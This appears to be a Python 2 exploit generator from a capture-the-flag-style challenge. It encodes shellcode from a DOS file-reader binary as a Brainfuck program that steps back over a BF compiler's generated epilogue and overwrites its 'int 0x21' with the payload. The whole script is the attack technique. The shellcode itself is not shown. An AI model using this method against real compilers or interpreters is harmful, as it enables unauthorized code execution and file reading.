#!/usr/bin/env python2

import sys

"""
The generated asm from BF just goes like this:
[...] # BF asm
# this part is the BF asm epilogue generated
00000015  B44C              mov ah,0x4c
00000017  B000              mov al,0x0
00000019  CD21              int 0x21
"""

# SC is our shellcode contained in DOS_file_reader.asm
with open("test.com", "rb") as f:
    SC = f.read()


p = ""
p += "+[<]>" # position bp to int 0x21

# first 2 bytes are going to be special since we rewrite the int 0x21
tmp = ord(SC[0])
while tmp > 0xCD:
    p += "-"
    tmp -= 1
while tmp < 0xCD:
    p += "+"
    tmp += 1
p += ">" # move bp
tmp = ord(SC[1])
while tmp > 0x21:
    p += "-"
    tmp -= 1
while tmp < 0x21:
    p += "+"
    tmp += 1
p += ">"

SC = SC[2:]
for x in SC:
    tmp = ord(x)
    for z in range(0, tmp):
        p += "+"
    p += ">"

print p
